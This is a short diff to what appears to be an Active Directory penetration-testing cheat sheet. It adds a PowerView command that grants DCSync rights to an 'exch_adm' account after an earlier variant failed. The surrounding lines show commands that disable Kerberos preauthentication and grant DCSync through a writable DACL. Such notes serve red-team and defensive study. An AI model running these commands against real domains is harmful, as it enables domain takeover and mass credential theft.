@@ -307,6 +307,9 @@ Set-DomainObject -Identity <USERNAME> -XOR @{useraccountcontrol=4194304} -Verbos
 - When writedacl on domain object
 ```
 Add-DomainObjectAcl -TargetIdentity 'DC=<PARENT DOMAIN>,DC=<TOP DOMAIN>' -PrincipalIdentity '<CHILD DOMAIN>\<USER>' -Rights DCSync -Verbose
+
+#After impersonating the user with these permissions the above didn't work, but this did:
+Add-ObjectAcl -PrincipalIdentity exch_adm -Rights DCSync
 ```
 
 #### Change owner
